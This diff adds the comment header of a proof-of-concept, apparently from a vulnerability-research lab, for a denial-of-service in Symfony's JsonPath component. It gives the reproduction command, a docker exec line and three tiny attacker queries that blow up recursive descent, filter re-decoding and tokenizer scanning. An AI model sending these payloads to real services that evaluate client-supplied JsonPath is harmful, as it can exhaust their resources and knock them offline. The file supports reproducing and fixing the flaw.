@@ -1,0 +1,18 @@
+# VULN-006 — JsonPath attacker-query DoS. Component-level PoC (no HTTP route in the lab;
+# the component's documented use case is evaluating a CLIENT-SUPPLIED query).
+# The "request" is the attacker-controlled JsonPath query string(s) fed to JsonCrawler::find().
+#
+# Reproduce exactly (run from exploits/VULN-006/):
+#   NO_COLOR=1 ./run.sh
+#
+# Under the hood it pipes this PHP to the live container's php over stdin:
+#
+#   docker exec -i \
+#     -e JSONPATH_SRC=/src/src/Symfony/Component/JsonPath \
+#     -e SIZES_B=500,1000,2000 -e DEPTHS_A=4,5,6 -e SIZES_C=25000,50000,100000 \
+#     cvehunterlab_symfony_app php -d memory_limit=256M
+#
+# The three attacker queries exercised (all tiny), each against a runtime-generated document:
+#   (a) recursive-descent explosion :  $..*..*          (7 bytes)  vs a nested tree document
+#   (b) O(N^2) per-element re-decode :  $.arr[?@.x==$.y] (16 bytes) vs {"y":-1,"arr":[{"x":0}..{"x":N}]}
+#   (c) uncapped tokenizer scan      :  $[?(@.a=="AAAA...(up to 100000)..." && @.a)]  vs {"a":1}
